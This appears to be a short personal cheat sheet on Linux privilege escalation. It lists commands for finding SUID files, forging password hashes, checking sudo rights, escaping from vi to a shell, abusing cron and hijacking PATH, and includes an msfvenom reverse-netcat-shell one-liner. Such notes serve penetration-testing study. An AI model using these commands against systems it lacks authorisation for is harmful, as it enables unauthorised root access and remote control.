#PrivEsc #Linux 

[LinEnum](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh)

## File permissions

r - 4
w - 2
x - 1

`find / -perm -u=s -type f 2>/dev/null` - Find SUID/GUID files on the system

`openssl passwd -1 -salt [salt] [password]` - Add a new password hash

`sudo -l` - List commands you can run as super user

[GTFOBins](https://gtfobins.github.io/): Curated list of Unix binaries that can be exploited, can elevate privileges if the program is listed with sudo

`:!sh` - Open a shell in vi

`cat /etc/crontab` - Check for Cron jobs

`msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R` - A reverse shell to run with Cron

**PATH:** Environmental variable which specifies directories that hold executable programs, this is how the user searches for executable files when running commands

`echo $PATH` - View relevant path

`export PATH=/[path]:/[another path]:$PATH` - changing the path variable

## Linux Privesc checklist

- [https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html)
- [https://payatu.com/guide-linux-privilege-escalation](https://payatu.com/guide-linux-privilege-escalation)